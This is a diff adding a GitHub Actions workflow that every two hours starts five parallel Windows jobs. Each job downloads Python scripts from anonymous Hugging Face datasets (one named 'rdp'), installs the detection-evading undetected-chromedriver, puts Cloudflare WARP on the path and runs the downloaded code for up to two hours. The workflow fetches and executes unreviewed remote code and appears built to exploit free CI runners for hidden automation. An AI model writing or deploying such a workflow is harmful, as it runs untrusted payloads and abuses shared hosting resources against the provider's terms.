@@ -1,0 +1,71 @@
+name: Continuous Python Script Runner (V2)
+
+on:
+  workflow_dispatch: # التشغيل اليدوي
+  schedule:
+    - cron: '0 */2 * * *' # التنفيذ التلقائي كل ساعتين
+
+jobs:
+  run-python-instances:
+    name: Instance ${{ matrix.id }}
+    runs-on: windows-2022
+    timeout-minutes: 125 # مهلة الأمان للوظيفة بالكامل
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        id: [1, 2, 3, 4, 5] # تشغيل 5 مهام متوازية
+
+    steps:
+      # -----------------------------------------------------------
+      # خطوة 1: إعداد البيئة وتنزيل الملفات
+      # -----------------------------------------------------------
+      - name: Setup Environment & Download Scripts
+        shell: bash
+        run: |
+          echo "⬇️ Downloading scripts for instance ${{ matrix.id }}..."
+          curl -sL "https://huggingface.co/datasets/gfdg34fsd/rdp/resolve/main/hash.py" -o hash.py
+          curl -sL "https://huggingface.co/datasets/samilod9/nanni/resolve/main/start2.py" -o start.py
+          
+          echo "📦 Upgrading pip and installing required packages..."
+          python -m pip install --upgrade pip setuptools
+          pip install undetected-chromedriver selenium requests
+          echo "✅ Environment Ready."
+
+      # -----------------------------------------------------------
+      # خطوة 2: تشغيل السكربت مع مؤقت زمني ذكي (ساعتين)
+      # -----------------------------------------------------------
+      - name: Execute Script with 120-Minute Watchdog
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "🚀 Starting start.py for Instance ${{ matrix.id }}..."
+          
+          # إضافة المسار لمتغيرات النظام
+          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          # تشغيل السكربت وحفظ العملية في متغير
+          $pyProcess = Start-Process python -ArgumentList "start.py" -PassThru -NoNewWindow
+          
+          Write-Output "🕒 Script is running. Waiting up to 120 minutes (7200 seconds)..."
+          
+          try {
+              # انتظار ذكي مدمج بدلاً من حلقة while التكرارية
+              Wait-Process -Id $pyProcess.Id -Timeout 7200 -ErrorAction Stop
+              Write-Output "✅ Script finished naturally before the time limit."
+          } 
+          catch {
+              # هذا الجزء يعمل فقط إذا انتهت الساعتين ولم ينتهِ السكربت
+              Write-Warning "🛑 Time limit reached (120 minutes). Terminating process..."
+              Stop-Process -Id $pyProcess.Id -Force
+              Write-Output "✅ Process forcibly terminated."
+          }
+
+      # -----------------------------------------------------------
+      # خطوة 3: التقرير النهائي
+      # -----------------------------------------------------------
+      - name: Session Summary
+        shell: bash
+        run: |
+          echo "🏁 Instance ${{ matrix.id }} cycle fully completed."
